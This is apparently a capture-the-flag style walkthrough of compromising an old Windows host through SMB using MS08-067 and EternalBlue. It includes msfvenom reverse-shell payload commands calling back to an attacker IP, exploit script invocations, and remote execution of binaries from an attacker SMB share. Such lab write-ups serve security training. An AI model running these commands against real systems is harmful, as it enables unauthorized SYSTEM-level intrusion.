Exploiting the SMB service on a Windows machine to achieve a system shell.

## Enumeration

```shell
nmap $ip
```

```shell
nmap --script smb-vuln* -p 139,445 $ip
```

The SMB service appears vulnerable to 2 well know exploits, MS08-067 and MS17-010 (Eternal Blue)

## MS08-067 Metasploit

```shell
search ms08-067
```

## MS17-010 Metasploit

```shell
search MS17-010
```

## MS08-067 Python Script

There are a fair few scripts for this vuln, but this one is pretty solid: <https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py>.

Create the payload.
```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.63 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

Start a NetCat listener on port 443 and execute the script as per the exploit instructions.
```shell
python ms08-067.py $ip 6 445
```

I get my shell.

I know that I'm NT AUTHORITY\SYSTEM, but how to prove it without Curl or Certutil? I have just exploited SMB, so that's the answer. I had transferred files with Samba before, but this was the first time I had executed code remotely/locally with SMB. Start the Samba server in the ***/usr/share/windows-resources/binaries*** directory and you can use SMB to run the binary on the target computer.

Attacking machine:

```shell
python3 /usr/share/doc/python3-impacket/examples/smbserver.py Samba . -smb2support
```

Target machine:

```shell
\\10.10.14.63\Samba\whoami.exe
```

## MS17-010 Python Script

Of the many scripts for the Eternal Blue exploit, this one has treated me the best: <https://github.com/helviojunior/MS17-010>. This script will retrieve a file from your machine and execute it, so a file with a payload needs to be created.

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.63 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o blue.exe
```

Run the send_and_execute script.

```shell
python send_and_execute.py 10.129.28.7 blue.exe
```
